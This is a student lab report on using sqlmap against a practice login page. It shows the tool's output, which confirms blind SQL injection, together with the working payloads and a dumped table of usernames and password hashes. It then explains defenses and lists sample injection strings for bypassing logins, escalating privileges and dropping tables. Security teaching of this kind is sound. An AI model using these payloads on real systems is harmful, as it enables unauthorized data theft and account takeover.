# sqlmapSyed Farabi and Anthony
SQLMap
March 2, 2025
CSCI 401

Lab Tasks
**** Hint: Use the output of sqlmap to find the answers
Vulnerability
Was the site vulnerable to SQL injection? If so, what risks were identified? 

SQL Map REPORT

┌──(kali㉿attacker)-[~]
└─$ sqlmap --wizard
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:39:38 /2025-03-14/

[03:39:38] [INFO] starting wizard interface
Please enter full target URL (-u): https://ethreal.com/backend/login
POST data (--data) [Enter for None]: 

[03:40:40] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 3
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
> 3

sqlmap is running, please wait..

[1/1] Form:
POST https://ethreal.com/backend/login
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
do you want to fill blank fields with random values? [Y/n] Y
got a 302 redirect to 'https://ethreal.com/backend/'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 484 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=BEgX' OR NOT 7066=7066-- QUYG&password=UeIL

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=BEgX' OR 3936=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- sYkr&password=UeIL
---
do you want to exploit this SQL injection? [Y/n] Y
web application technology: Nginx 1.27.4
back-end DBMS: SQLite
banner: '3.40.1'
current user is DBA: True
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: <current>
Table: users
[6 entries]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 405a488dc022b9c55508c67468357982ba4d4ff639e70fbd1ac269851eb96bf9 | aeronis  |
| 2  | 937ba8286128953b9857d658f192f4a176c4307136aabe0ae81465baf9eeccb5 | durnik   |
| 3  | 008972f765a80b4da77026f227f70cd57454fb808333396ee232420483780ed2 | finnwise |
| 4  | 6f2bd81e6f2169a810c0a14a2e4d9b15aa05f2e017132a43b38ecf98ecf1d584 | kaelen   |
| 5  | 4daba22d4b9482d1449134418a2ca63dcc81fbe418a8971f62f8925541a103e4 | lioran   |
| 6  | 9e9f5a413726d993fc9cbd95ec49d256e0aa3f7d613fb83da7db708dd38ff2ac | thalnor  |
+----+------------------------------------------------------------------+----------+


[*] ending @ 03:42:05 /2025-03-14/



The site was vulnerable to sql injection attack.


Yes, the site was vulnerable to SQL injection.
The attacker was able to extract sensitive user data, including password hashes.
If an attacker cracks the password hashes, they could gain unauthorized access.
The DBA privileges further increase the risk, allowing full database control.










Take a screenshot of the extracted table

 










DBMS	
< What type of database management system (DBMS) was detected? >


Sqlite dbms was detected


web application technology: Nginx 1.27.4
back-end DBMS: SQLite
banner: '3.40.1'
current user is DBA: True



Which Method
< Which SQL injection technique provided the most useful information? Which worked>




Based on the SQLMap output, Boolean-based blind SQL injection and Time-based blind SQL injection were both successfully used. However, the Boolean-based blind SQL injection appears to have been the most effective in extracting useful information.




Boolean-Based Blind SQL Injection (Most Useful)
This technique was able to retrieve data by evaluating true/false conditions.
Example payload used:
 

username=BEgX' OR NOT 7066=7066-- QUYG&password=UeIL

Why it was useful:
It allowed SQLMap to confirm that the site was vulnerable.
It helped extract the usernames and password hashes from the database.








Time-Based Blind SQL Injection
This method introduced delays in the database response to infer if the injection was successful.
Example payload used:


username=BEgX' OR 3936=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- sYkr&password=UeIL



Why it was useful:
It confirmed the presence of a vulnerability even when no direct error messages were displayed.
However, it was slower compared to Boolean-based injection.







Boolean-Based Blind SQL Injection was the most useful because it successfully extracted the database name, usernames, and password hashes from the users table.
Time-Based Blind SQL Injection helped confirm the vulnerability but was not as efficient in extracting large amounts of data.




Defensive Measures
< What countermeasures can mitigate SQL injection vulnerabilities? >


1. Use Prepared Statements (Parameterized Queries)

     Instead of dynamically building SQL queries, use prepared statements to separate SQL logic from user inputs


import sqlite3

conn = sqlite3.connect("database.db")
cursor = conn.cursor()

username = input("Enter username: ")
password = input("Enter password: ")

cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
result = cursor.fetchone()


Prepared statements prevent SQL code injection by treating user input as data, not code.






2. Input Validation & Whitelisting


Validate user input to allow only expected formats (e.g., restrict inputs to alphanumeric characters).


import re
if not re.match("^[a-zA-Z0-9_]+$", username):
    print("Invalid username format!")


this will Prevents malicious input from reaching the SQL query





3. Least Privilege Principle

The web application should not run with DBA (Database Administrator) privileges.
Use a restricted database user that has only the necessary permissions.





4. Hash and Salt Passwords


Store hashed passwords instead of plaintext. Use bcrypt, Argon2, or PBKDF2.

import bcrypt

hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())







5. Web Application Firewall (WAF)

Deploy a WAF (e.g., ModSecurity) to detect and block SQL injection attempts.
 It adds an extra layer of defense by filtering malicious requests




6. Disable Error Messages in Production

Do not expose detailed error messages to users. Instead, use generic messages:
python:

try:
    cursor.execute(query)
except sqlite3.Error:
    print("An error occurred. Please try again later.")








7.Use ORM (Object-Relational Mapping):

Use frameworks like SQLAlchemy (Python) or Entity Framework (C#) to abstract SQL queries.
Why? ORM prevents direct SQL injection vulnerabilities.


8. Regular Security Testing:

Perform SQL injection testing using tools like:
SQLMap (for automated testing).
Burp Suite (for manual testing).







Risks
< What are the potential risks of a successful SQL injection attack? >



1. Unauthorized Access to Data:

Attackers can retrieve sensitive information (usernames, passwords, emails, financial data, etc.).

' OR 1=1-- 

This could allow attackers to bypass authentication and log in as any user, including administrators.




2. Data Exfiltration 

Attackers can extract entire databases, including personal data and confidential business records.

UNION SELECT username, password FROM users–

This can lead to identity theft and data breaches.





3. Data Manipulation (Tampering)

Attackers can modify, delete, or insert data in the database.

UPDATE users SET password='hacked' WHERE username='admin'--


This could lock out legitimate users or corrupt important records







4. Account Takeover & Privilege Escalation:

Attackers can alter account permissions to grant themselves admin privileges.

UPDATE users SET role='admin' WHERE username='attacker'--



5. Denial of Service (DoS)



Attackers can run heavy SQL queries to overload the database, causing the website to crash.


SELECT * FROM large_table WHERE id = (SELECT COUNT(*) FROM another_large_table)--




6. Extraction of Password Hashes & Credential Theft:

Even if passwords are hashed, weak hashing algorithms (MD5, SHA-1) can be cracked.

SELECT username, password FROM users–

Attackers can brute-force or use rainbow tables to crack passwords.



7. Taking Full Control of the Server (Remote Code Execution):

In some cases, SQL injection can allow command execution on the server.

'; DROP TABLE users; –

Attackers may delete entire databases or execute system commands.





8. Compliance Violations & Legal Consequences:


Data breaches caused by SQL injection can violate laws like:
GDPR (Europe) – Fines up to €20 million.
HIPAA (US) – Fines for healthcare data breaches.
PCI DSS (Payment Card Industry) – Can result in losing the ability to process credit card payments.




